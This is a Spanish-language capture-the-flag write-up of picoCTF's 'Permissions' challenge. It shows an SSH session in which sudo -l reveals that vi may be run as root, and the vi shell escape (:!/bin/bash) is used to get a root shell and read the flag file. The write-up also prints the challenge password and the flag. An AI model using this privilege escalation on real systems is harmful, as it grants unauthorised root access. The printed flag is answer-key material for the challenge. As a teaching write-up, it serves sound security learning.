### Permissions

### Descripción

Can you read files in the root file?The system admin has provisioned an account for you on the main server:`ssh -p 49261 picoplayer@saturn.picoctf.net`Password: `33qE7mB5BF`Can you login and read the root file?
### Solución

### Solucion 1 - Usando Consola

```
 ssh -p 49261 picoplayer@saturn.picoctf.net
picoplayer@saturn.picoctf.net's password: 33qE7mB5BF

cd /
picoplayer@challenge:/$ ls
bin  boot  challenge  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
picoplayer@challenge:/$ sudo -l   
[sudo] password for picoplayer: 33qE7mB5BF

Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:/$ cd usr/bin/vi
-bash: cd: usr/bin/vi: Not a directory

sudo /usr/bin/vi

root@challenge:/# cd challenge/
root@challenge:/challenge# ls
metadata.json

root@challenge:/challenge# cat metadata.json 
{"flag": "picoCTF{uS1ng_v1m_3dit0r_3dd6dcf4}", "username": "picoplayer", "password": "33qE7mB5BF"}root@challenge:/challenge# Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.

```

### Notas 
- `sudo -l` es un comando que indica los privilegios que se tienen en el sistema.
- en vi ejecutamos el comando :!/bin bash, donde :
	- - **`:`** : Le dice al editor que vas a ingresar un comando en el modo "Ex" (la línea de abajo).
    
	- **`!`** : Es el símbolo universal en muchos programas de Linux para decir: _"No ejecutes esto dentro del programa, pásalo a la terminal del sistema (shell)"_.
    
	- `/bin/bash` : Es la ruta del programa que queríamos ejecutar (la terminal).
